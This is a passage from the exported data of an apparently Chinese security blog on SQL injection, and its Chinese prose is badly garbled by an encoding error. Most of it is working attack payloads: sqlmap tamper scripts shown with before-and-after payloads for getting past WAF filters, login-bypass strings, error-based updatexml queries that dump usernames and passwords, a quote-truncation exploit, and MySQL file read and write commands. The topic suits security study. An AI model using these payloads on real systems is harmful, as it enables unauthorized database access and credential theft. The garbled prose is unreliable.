securesphere.pyé€‚ç”¨æ•°æ®åº“ï¼šALLä½œç”¨ï¼šè¿½åŠ ç‰¹å®šçš„å­—ç¬¦ä¸²ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 1=1â€™)ä½¿ç”¨è„šæœ¬åï¼š1 AND 1=1 and â€˜0havingâ€™=â€™0havingâ€™ space2dash.pyé€‚ç”¨æ•°æ®åº“ï¼šALLä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸ºâ€“ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œæ¢è¡Œç¬¦ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 9227=9227â€™)ä½¿ç”¨è„šæœ¬åï¼š1â€“nVNaVoPYeva%0AANDâ€“ngNvzqu%0A9227=9227 space2mssqlblank.pyé€‚ç”¨æ•°æ®åº“ï¼šMicrosoft SQL Serveræµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2000ã€Microsoft SQL Server 2005ä½œç”¨ï¼šå°†ç©ºæ ¼éšæœºæ›¿æ¢ä¸ºå…¶ä»–ç©ºæ ¼ç¬¦å·(â€˜%01â€™, â€˜%02â€™, â€˜%03â€™, â€˜%04â€™, â€˜%05â€™, â€˜%06â€™, â€˜%07â€™, â€˜%08â€™, â€˜%09â€™, â€˜%0Bâ€™, â€˜%0Câ€™, â€˜%0Dâ€™, â€˜%0Eâ€™, â€˜%0Fâ€™, â€˜%0Aâ€™)ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™)ä½¿ç”¨è„šæœ¬åï¼šSELECT%0Eid%0DFROM%07users between.pyæµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0ä½œç”¨ï¼šç”¨NOT BETWEEN 0 AND #æ›¿æ¢&gt;ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND A &gt; Bâ€“â€™)ä½¿ç”¨è„šæœ¬åï¼š1 AND A NOT BETWEEN 0 AND Bâ€“ percentage.pyé€‚ç”¨æ•°æ®åº“ï¼šASPæµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2000, 2005ã€MySQL 5.1.56, 5.5.11ã€PostgreSQL 9.0ä½œç”¨ï¼šåœ¨æ¯ä¸ªå­—ç¬¦å‰æ·»åŠ ä¸€ä¸ª%ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT FIELD FROM TABLEâ€™)ä½¿ç”¨è„šæœ¬åï¼š%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E sp_password.pyé€‚ç”¨æ•°æ®åº“ï¼šMSSQLä½œç”¨ï¼šä»T-SQLæ—¥å¿—çš„è‡ªåŠ¨è¿·ç³Šå¤„ç†çš„æœ‰æ•ˆè½½è·ä¸­è¿½åŠ sp_passwordä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 9227=9227â€“ â€˜)ä½¿ç”¨è„šæœ¬åï¼š1 AND 9227=9227â€“ sp_password charencode.pyæµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0ä½œç”¨ï¼šå¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨urlç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT FIELD FROM%20TABLEâ€™)ä½¿ç”¨è„šæœ¬åï¼š%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45 randomcase.pyæµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0ä½œç”¨ï¼šéšæœºå¤§å°å†™ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜INSERTâ€™)ä½¿ç”¨è„šæœ¬åï¼šINseRt charunicodeencode.pyé€‚ç”¨æ•°æ®åº“ï¼šASPã€ASP.NETæµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2000/2005ã€MySQL 5.1.56ã€PostgreSQL 9.0.3ä½œç”¨ï¼šé€‚ç”¨å­—ç¬¦ä¸²çš„unicodeç¼–ç ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT FIELD%20FROM TABLEâ€™)ä½¿ç”¨è„šæœ¬åï¼š%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045 space2comment.pyæµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º//ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™)ä½¿ç”¨è„šæœ¬åï¼šSELECT//id//FROM//users equaltolike.pyæµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ä½œç”¨ï¼šå°†=æ›¿æ¢ä¸ºLIKEä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT * FROM users WHERE id=1â€™)ä½¿ç”¨è„šæœ¬åï¼šSELECT * FROM users WHERE id LIKE 1 equaltolike.pyæµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0ä½œç”¨ï¼šå°†&gt;æ›¿æ¢ä¸ºGREATESTï¼Œç»•è¿‡å¯¹&gt;çš„è¿‡æ»¤ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND A &gt; Bâ€™)ä½¿ç”¨è„šæœ¬åï¼š1 AND GREATEST(A,B+1)=A ifnull2ifisnull.pyé€‚ç”¨æ•°æ®åº“ï¼šMySQLã€SQLite (possibly)ã€SAP MaxDB (possibly)æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.0 and 5.5ä½œç”¨ï¼šå°†ç±»ä¼¼äºIFNULL(A, B)æ›¿æ¢ä¸ºIF(ISNULL(A), B, A)ï¼Œç»•è¿‡å¯¹IFNULLçš„è¿‡æ»¤ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜IFNULL(1, 2)â€™)ä½¿ç”¨è„šæœ¬åï¼šIF(ISNULL(1),2,1) modsecurityversioned.pyé€‚ç”¨æ•°æ®åº“ï¼šMySQLæµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.0ä½œç”¨ï¼šè¿‡æ»¤ç©ºæ ¼ï¼Œä½¿ç”¨mysqlå†…è”æ³¨é‡Šçš„æ–¹å¼è¿›è¡Œæ³¨å…¥ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 2&gt;1â€“â€™)ä½¿ç”¨è„šæœ¬åï¼š1 /!30874AND 2&gt;1/â€“ space2mysqlblank.pyé€‚ç”¨æ•°æ®åº“ï¼šMySQLæµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.1ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸ºå…¶ä»–ç©ºæ ¼ç¬¦å·(â€˜%09â€™, â€˜%0Aâ€™, â€˜%0Câ€™, â€˜%0Dâ€™, â€˜%0Bâ€™)ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™)ä½¿ç”¨è„šæœ¬åï¼šSELECT%0Bid%0DFROM%0Cusers modsecurityzeroversioned.pyé€‚ç”¨æ•°æ®åº“ï¼šMySQLæµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.0ä½œç”¨ï¼šä½¿ç”¨å†…è”æ³¨é‡Šæ–¹å¼ï¼ˆ/!00000/ï¼‰è¿›è¡Œæ³¨å…¥ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 2&gt;1â€“â€™)ä½¿ç”¨è„šæœ¬åï¼š1 /!00000AND 2&gt;1/â€“ space2mysqldash.pyé€‚ç”¨æ•°æ®åº“ï¼šMySQLã€MSSQLä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º â€“ ï¼Œå¹¶è¿½éšä¸€ä¸ªæ¢è¡Œç¬¦ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 9227=9227â€™)ä½¿ç”¨è„šæœ¬åï¼š1â€“%0AANDâ€“%0A9227=9227 bluecoat.pyé€‚ç”¨æ•°æ®åº“ï¼šBlue Coat SGOSæµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.1,ã€SGOSä½œç”¨ï¼šåœ¨sqlè¯­å¥ä¹‹åç”¨æœ‰æ•ˆçš„éšæœºç©ºç™½å­—ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦ï¼Œéšåç”¨LIKEæ›¿æ¢=ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM users where id = 1â€™)ä½¿ç”¨è„šæœ¬åï¼šSELECT%09id FROM users where id LIKE 1 versionedkeywords.pyé€‚ç”¨æ•°æ®åº“ï¼šMySQLæµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 4.0.18, 5.1.56, 5.5.11ä½œç”¨ï¼šæ³¨é‡Šç»•è¿‡ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#â€™)ä½¿ç”¨è„šæœ¬åï¼š1/!UNION//!ALL//!SELECT//!NULL/,/!NULL/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/!AS//!CHAR/),CHAR(32)),CHAR(58,100,114,117,58))# halfversionedmorekeywords.pyé€‚ç”¨æ•°æ®åº“ï¼šMySQL &lt; 5.1æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 4.0.18/5.0.22ä½œç”¨ï¼šåœ¨æ¯ä¸ªå…³é”®å­—å‰æ·»åŠ mysqlç‰ˆæœ¬æ³¨é‡Šä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œvalueâ€™ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND â€˜QDWaâ€™=â€™QDWaâ€)ä½¿ç”¨è„šæœ¬åï¼švalueâ€™/!0UNION/!0ALL/!0SELECT/!0CONCAT(/!0CHAR(58,107,112,113,58),/!0IFNULL(CAST(/!0CURRENT_USER()/!0AS/!0CHAR),/!0CHAR(32)),/!0CHAR(58,97,110,121,58)),/!0NULL,/!0NULL#/!0AND â€˜QDWaâ€™=â€™QDWa space2morehash.pyé€‚ç”¨æ•°æ®åº“ï¼šMySQL &gt;= 5.1.13æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMySQL 5.1.41ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸º#ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œæ¢è¡Œç¬¦ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 9227=9227â€™)ä½¿ç”¨è„šæœ¬åï¼š1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227 apostrophenullencode.pyé€‚ç”¨æ•°æ®åº“ï¼šALLä½œç”¨ï¼šç”¨éæ³•åŒå­—èŠ‚Unicodeå­—ç¬¦æ›¿æ¢å•å¼•å·ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œ1 AND â€˜1â€™=â€™1â€)ä½¿ç”¨è„šæœ¬åï¼š1 AND %00%271%00%27=%00%271 appendnullbyte.pyé€‚ç”¨æ•°æ®åº“ï¼šALLä½œç”¨ï¼šåœ¨æœ‰æ•ˆè½½è·çš„ç»“æŸä½ç½®åŠ è½½nullå­—èŠ‚å­—ç¬¦ç¼–ç ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 1=1â€™)ä½¿ç”¨è„šæœ¬åï¼š1 AND 1=1%00 chardoubleencode.pyé€‚ç”¨æ•°æ®åº“ï¼šALLä½œç”¨ï¼šå¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨åŒé‡urlç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT FIELD FROM%20TABLEâ€™)ä½¿ç”¨è„šæœ¬åï¼š%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545 unmagicquotes.pyé€‚ç”¨æ•°æ®åº“ï¼šALLä½œç”¨ï¼šç”¨ä¸€ä¸ªå¤šå­—èŠ‚ç»„åˆ%bf%27å’Œæœ«å°¾é€šç”¨æ³¨é‡Šä¸€èµ·æ›¿æ¢ç©ºæ ¼ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œ1â€™ AND 1=1â€)ä½¿ç”¨è„šæœ¬åï¼š1%bf%27 AND 1=1â€“ randomcomments.pyé€‚ç”¨æ•°æ®åº“ï¼šALLä½œç”¨ï¼šç”¨æ³¨é‡Šç¬¦åˆ†å‰²sqlå…³é”®å­—ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜INSERTâ€™)ä½¿ç”¨è„šæœ¬åï¼šI//N//SERT åœ¨ç†Ÿæ‚‰äº†tamperè„šæœ¬ä¹‹åï¼Œæˆ‘ä»¬åº”è¯¥å­¦ä¹ tamperç»•è¿‡è„šæœ¬çš„ç¼–å†™è§„åˆ™ï¼Œæ¥åº”å¯¹å¤æ‚çš„å®é™…ç¯å¢ƒã€‚ åå…«ã€ç»•è¿‡å§¿åŠ¿ str_replace()ä»»ä½•çš„è¡¨åã€æ•°æ®åº“åéƒ½å¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶ä»£æ›¿ 1?id=-1%df&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema= 0x7365637572697479),3--+ ä¸‡èƒ½å¯†ç ï¼š$sql=&quot;select * from test where username=&#39; XX &#39; and password=&#39; XX &#39; &quot;; 12345678910# ä¸çŸ¥ç”¨æˆ·åæ—¶&#x27; or 1--+ # æ³¨é‡Šé—­åˆ&#x27; or &#x27;1&#x27;=&#x27;1 # æ‰‹åŠ¨é—­åˆ&#x27; or &#x27;1&#x27;=&#x27;1&#x27;# # ä½¿ç”¨äº†æ³¨é‡Š## çŸ¥é“ä¸€ä¸ªç”¨æˆ·åadmin&#x27; or &#x27;1&#x27;=&#x27;1# å¯å°è¯•1&#x27;or(1)# è¿‡æ»¤ æ³¨é‡Šï¼š æ³•ä¸€ï¼šæˆªæ–­ ;%00 12;%00?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1);%00 æ³•äºŒï¼šæ‰‹åŠ¨é—­åˆ 121&#x27;and&#x27;1&#x27;=&#x27;1?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)and&#x27;1&#x27;=&#x27;1 è¿‡æ»¤ç©ºæ ¼ï¼š æ‹¬å·åŒ…å›´ï¼šå¯¹äºä¸€äº›å­—æ®µåå¯ä½¿ç”¨æ‹¬å·åŒ…å›´ 1?id=1&#x27;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;security&#x27;)),0x7e),1);%0 å­—ç¬¦ç¼–ç ç»•è¿‡ï¼š 12345678910# å¯ä»¥ç»•è¿‡ç©ºæ ¼çš„ç¼–ç ï¼š%09 Tabé”®-æ°´å¹³%0a æ¢è¡Œ%0c æ¢é¡µ%0b Tabé”®-å‚ç›´%0d%00%a0 åœ¨ç‰¹å®šå­—ç¬¦é›†æ‰å¯ä½¿ç”¨# ç‰¹æ®Šçš„ /**/ å¤§å°å†™ç»•è¿‡ï¼š Mysql ä¸­ï¼Œå…³é”®å­—æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œå¦‚æœä»…ä»…æ˜¯è¿‡æ»¤äº† select ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ SelECt ï¼Œè¿›è¡Œå¤§å°å†™æ··å†™ç»•è¿‡ã€‚ æ­£åˆ™åŒ¹é…ï¼š æ­£åˆ™å¦‚æœåŒ¹é… \\bselect\\b ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ /*!50000select*/ ç»•è¿‡ã€‚ ä¸€æ¬¡è¿‡æ»¤ï¼šåŒå†™ç»•è¿‡ï¼š 123$id=preg_replace(&#x27;/or/i&#x27;,&quot;&quot;,$id);$id=preg_replace(&#x27;/and/i&#x27;,&quot;&quot;,$id);$id=preg_replace(&#x27;/select/i&#x27;,&quot;&quot;,$id); and or è¿‡æ»¤ï¼šåŒå†™ç»•è¿‡ï¼Œæˆ–è€…æ˜¯ &amp;&amp;â€“&gt;%26%26 ||â€“&gt;%7c%7c 123?id=1&#x27;||updatexml(1,concat(0x7e,database(),0x7e),1);%00?id=1&#x27;||updatexml(1,concat(0x7e,database(),0x7e),1)||&#x27;1&#x27;=&#x27;1 è¿‡æ»¤äº†å•åŒå¼•å·ï¼Œä½†æ²¡æœ‰è¿‡æ»¤ åæ–œæ  \\ ä¾‹å¦‚ï¼šsql è¯­å¥ 1$sql=&quot;select * from nres where id=&#x27;å¯æ§å‚æ•°1&#x27; and title=&#x27;å¯æ§å‚æ•°2&#x27;&quot;; æˆ‘ä»¬å¯ä»¥è¿›è¡Œå¦‚ä¸‹æ„é€ ï¼Œä¸ä½¿ç”¨ å•åŒå¼•å·ï¼Œåˆ©ç”¨åæ–œæ  12345id=a\\title=or sleep(3)##è¿™æ ·æ‹¼èµ·æ¥çš„ sql è¯­å¥å°±æ˜¯$sql=&quot;select * from nres where id=&#x27;a\\&#x27; and title=&#x27;or sleep(3)#&#x27;&quot;;# å¦‚æ­¤ï¼Œor sleep(3)# ä¾¿æˆäº†ä¸€ä¸ªæ•´ä½“ï¼Œå°†ä¼šæˆåŠŸæ‰§è¡Œåé¢çš„ sleep(3) ä½¿ç”¨ 12select * from users where id=&#x27;a\\&#x27; and username=&#x27; or sleep(2)#&#x27;select * from users where id=&#x27;a\\&#x27; and username=&#x27;union select 1,2,(select concat(username,0x7e,password) from users limit 1)#&#x27; å¼•å·é€ƒé€¸ï¼šå…¶å®å°±æ˜¯ç”±äºåšäº†è½¬ä¹‰ å¯¹å•å¼•å·ã€åŒå¼•å·ç­‰è¿›è¡Œè½¬ä¹‰ä¹‹åï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šå¦¨ç¢äº†æˆ‘ä»¬çš„æ³¨å…¥ï¼Œå½“é‡åˆ°è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘ï¼šå®½å­—èŠ‚æ³¨å…¥ã€äºŒæ¬¡æ³¨å…¥ã€HTTP å¤´éƒ¨æ³¨å…¥ å­—ç¬¦ä¸²æˆªæ–­ï¼š åœ¨ä¸€äº›æ ‡é¢˜ç­‰ä½ç½®ï¼Œå¼€å‘è€…ä¸€èˆ¬ä¼šé™åˆ¶æ ‡é¢˜çš„å­—ç¬¦é•¿åº¦ï¼Œå¦‚æœè¶…è¿‡ï¼Œæœ‰å¯èƒ½ä¼šè¢«æˆªæ–­ã€‚ ä»£ç ï¼š 12345678910111213&lt;?php $conn = mysqli_connect(&#x27;127.0.0.1&#x27;,&#x27;root&#x27;,&#x27;123456&#x27;,&#x27;security&#x27;); $title = addslashes($_GET[&#x27;title&#x27;]); echo $title; $title = substr($title,0,10); #åšäº†æˆªæ–­å¤„ç† echo &#x27;&lt;br /&gt;&#x27;.$title; echo &#x27;&lt;h1&gt;$title&lt;/h1&gt;&#x27;; $content = addslashes($_GET[&#x27;content&#x27;]); echo $content; $sql = &quot;insert into users values(15, &#x27;$title&#x27; , &#x27;$content&#x27;)&quot;; echo &#x27;&lt;br /&gt;&#x27;.$sql; $res = mysqli_query($conn,$sql);?&gt; å¦‚æœæ”»å‡»è€…æƒ³è¿›è¡Œ sql æ³¨å…¥æµ‹è¯•ï¼Œå¯ä»¥é€‰æ‹©è¾“å…¥ aaaaaaaaa&#39; ï¼Œåˆ™ç»è¿‡è½¬ä¹‰ä¹‹åï¼Œå°†ä¼šå˜ä¸º aaaaaaaaa\\&#39; ï¼Œä½†æ˜¯ç”±äºåé¢çš„æˆªæ–­ï¼Œå°†å˜æˆ aaaaaaaaa\\ã€‚ ä½¿ç”¨ï¼š 1?title=aaaaaaaaa\\&#x27;&amp;content=,1),(16,321,2)--+ è¿™æ ·æ‹¼æ¥åˆ° sql è¯­å¥ä¸­å°±å˜æˆ 1insert into news values(15, &#x27;aaaaaaaaa\\&#x27; , &#x27;,1),(16,321,2)--+&#x27;) è¿™æ · ç”±äºè½¬ä¹‰ä½¿å¾— aaaaaaaaa\\&#39; , æˆä¸ºäº†ç”±å•å¼•å·åŒ…å›´çš„ä¸€éƒ¨åˆ†ï¼Œä¹Ÿå°±æˆåŠŸæ‰§è¡Œäº† æ’å…¥è¯­å¥ã€‚ è¿‡æ»¤ç­‰å· = ä½¿ç”¨ like 1a&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))or&#x27; åä¹ã€å…¶å®ƒ åœ¨ä»¥ä¸Šçš„ä»»ä½•ä¸€ä¸ªæ³¨å…¥æ–¹å¼ä¸­ï¼Œéƒ½æœ‰å¯èƒ½å¯¹ç”¨æˆ·æ‰€è¾“å…¥çš„å†…å®¹è¿›è¡Œç¼–ç ï¼Œä¾‹å¦‚è¿›è¡Œ base64 ç¼–ç ï¼Œæˆ‘ä»¬è¿›è¡Œçˆ†ç ´æ—¶è¦è®°å¾—ç¼–ç ï¼› Nosql æ³¨å…¥ https://www.cnblogs.com/bonelee/p/12158385.html äºŒåã€è§£å†³æŸ¥å†…å®¹æ—¶ä¸€æ¬¡æ˜¾ç¤ºä¸å…¨æ–¹æ³•ä¸€ï¼šä¸€æ¡ä¸€æ¡æŸ¥ 123and updatexml(1,concat(0x5e,(select concat(username,&#x27;~&#x27;,password) from security.users limit 0,1),0x5e),1)#and updatexml(1,concat(0x5e,(select concat_ws(&#x27;~&#x27;,username,password) from security.users limit 0,1),0x5e),1)# æ–¹æ³•äºŒï¼šsubstr(,,) 1234# æ¯æ¬¡æŸ¥30ä¸ªå­—ç¬¦and updatexml(1,concat(0x5e,(select substr(group_concat(concat_ws(&#x27;~&#x27;,username,password)),1,30) from security.users),0x5e),1)#and updatexml(1,concat(0x5e,(select substr(group_concat(concat_ws(&#x27;~&#x27;,username,password)),31,30) from security.users),0x5e),1)# æ€»ç»“ï¼šregexp æ­£åˆ™åŒ¹é…é€ŸæŸ¥è¡¨12# ä½¿ç”¨&lt;å†…å®¹&gt; regexp &#x27;æ­£åˆ™è¡¨è¾¾å¼&#x27; é€‰é¡¹ è¯´æ˜ ä¾‹å­ åŒ¹é…å€¼ç¤ºä¾‹ ^ åŒ¹é…æ–‡æœ¬çš„å¼€å§‹å­—ç¬¦ â€˜^bâ€™ åŒ¹é…ä»¥å­—æ¯ b å¼€å¤´çš„å­—ç¬¦ä¸² bookã€bigã€bananaã€bike $ åŒ¹é…æ–‡æœ¬çš„ç»“æŸå­—ç¬¦ â€˜st$â€™ åŒ¹é…ä»¥ st ç»“å°¾çš„å­—ç¬¦ä¸² testã€resistã€persist . åŒ¹é…ä»»ä½•å•ä¸ªå­—ç¬¦ â€˜b.tâ€™ åŒ¹é…ä»»ä½• b å’Œ t ä¹‹é—´æœ‰ä¸€ä¸ªå­—ç¬¦ bitã€batã€butã€bite * åŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªåœ¨å®ƒå‰é¢çš„å­—ç¬¦ â€˜f*nâ€™ åŒ¹é…å­—ç¬¦ n å‰é¢æœ‰ä»»æ„ä¸ªå­—ç¬¦ f fnã€fanã€faanã€abcn + åŒ¹é…å‰é¢çš„å­—ç¬¦ 1 æ¬¡æˆ–å¤šæ¬¡ â€˜ba+â€™ åŒ¹é…ä»¥ b å¼€å¤´ï¼Œåé¢è‡³å°‘ç´§è·Ÿä¸€ä¸ª a baã€bayã€bareã€battle &lt;å­—ç¬¦ä¸²&gt; åŒ¹é…åŒ…å«æŒ‡å®šå­—ç¬¦çš„æ–‡æœ¬ â€˜faâ€™ åŒ¹é…åŒ…å«â€˜faâ€™çš„æ–‡æœ¬ fanã€afaã€faad [å­—ç¬¦é›†åˆ] åŒ¹é…å­—ç¬¦é›†åˆä¸­çš„ä»»ä½•ä¸€ä¸ªå­—ç¬¦ â€˜[xz]â€™ åŒ¹é… x æˆ–è€… z dizzyã€zebraã€x-rayã€extra [^ ] åŒ¹é…ä¸åœ¨æ‹¬å·ä¸­çš„ä»»ä½•å­—ç¬¦ â€˜[^abc]â€™ åŒ¹é…ä»»ä½•ä¸åŒ…å« aã€b æˆ– c çš„å­—ç¬¦ä¸² deskã€foxã€f8ke å­—ç¬¦ä¸²{n,} åŒ¹é…å‰é¢çš„å­—ç¬¦ä¸²è‡³å°‘ n æ¬¡ â€˜b{2}â€™ åŒ¹é… 2 ä¸ªæˆ–æ›´å¤šçš„ b bbbã€bbbbã€bbbbbbb å­—ç¬¦ä¸² {n,m} åŒ¹é…å‰é¢çš„å­—ç¬¦ä¸²è‡³å°‘ n æ¬¡ï¼Œ è‡³å¤š m æ¬¡ â€˜b{2,4}â€™ åŒ¹é…æœ€å°‘ 2 ä¸ªï¼Œæœ€å¤š 4 ä¸ª b bbbã€bbbb åŒ¹é…ä¸­æ–‡æ—¶ï¼šregexp &#39;(æ–‡å­—)&#39; 123regexp &#x27;[æ–‡å­—]&#x27; #æŠ¥é”™regexp &#x27;æ–‡å­—&#x27;like &#x27;æ–‡å­—&#x27; Mysql å¯¹æ–‡ä»¶çš„æ“ä½œ load_file() load data infile() system cat ä½¿ç”¨æ¡ä»¶ï¼š1. æœ‰Fileæƒé™ï¼ˆFile_privçš„å€¼ï¼‰ï¼›2. secure_file_priv çš„å€¼ä¸ä¸º NULL æ³¨ï¼š&gt;=5.7.16é»˜è®¤å€¼ä¸ºNULLï¼Œ&lt;5.7.16åˆ™ä¸ºç©º 12#æŸ¥çœ‹ File_privselect File_priv from mysql.user where user=&#x27;root&#x27; and host =&#x27;localhost&#x27;; 12345678910#æŸ¥çœ‹ secure_file_privshow global variables like &quot;secure_file_priv&quot;;å€¼æ˜¯ NULL --- ä¸å…è®¸æ–‡ä»¶å¯¼å…¥å¯¼å‡ºæ“ä½œå€¼æ˜¯ ç©º --- ä¸å¯¹mysqlçš„å¯¼å…¥å¯¼å‡ºæ“ä½œåšå‡ºé™åˆ¶å€¼æ˜¯ å…·ä½“è·¯å¾„ é™åˆ¶mysqlçš„å¯¼å…¥ä¸å¯¼å‡ºæ“ä½œé™åˆ¶åœ¨æŒ‡å®šè·¯å¾„ä¸‹#ä¿®æ”¹# Windows ä¸‹ä¿®æ”¹ mysql.ini æ–‡ä»¶ ï¼ˆsecure_file_priv =ï¼‰# Linux ä¸‹åœ¨/etc/my.cnfçš„[mysqld]ä¸‹é¢æ·»åŠ local-infile=0é€‰é¡¹ è¯»å–æ–‡ä»¶ 12345678# load_file()select load_file(&#x27;D:/test.txt&#x27;);# load data infile()# åˆ©ç”¨è¯¥å‡½æ•°è¯»æ–‡ä»¶æ—¶éœ€è¦å°†æ–‡ä»¶å†…å®¹ä¿å­˜è‡³ä¸€ä¸ªè¡¨ä¸­create table test(content text);load data infile &#x27;D:\\\\test.txt&#x27; into table test;select * from test; å†™å…¥æ–‡ä»¶ 1select * into outfile &#x27;D:\\\\users.txt&#x27; from users;","categories":[{"name":"WEBæ¼æ´è¯¦è§£","slug":"WEBæ¼æ´è¯¦è§£","permalink":"https://xizhi-future.github.io/categories/WEB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"}],"tags":[{"name":"æ¼æ´","slug":"æ¼æ´","permalink":"https://xizhi-future.github.io/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"https://xizhi-future.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}],"author":"xizhi-future"},{"title":"è®¡ç®—æœºç½‘ç»œæ¦‚å¿µã€å‘å±•ã€æ€§èƒ½","slug":"è®¡ç®—æœºç½‘ç»œæ¦‚å¿µã€å‘å±•ã€æ€§èƒ½","date":"2021-10-07T10:05:01.000Z","updated":"2021-10-07T10:05:55.993Z","comments":true,"path":"2021/10/07/è®¡ç®—æœºç½‘ç»œæ¦‚å¿µã€å‘å±•ã€æ€§èƒ½/","link":"","permalink":"https://xizhi-future.github.io/2021/10/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E5%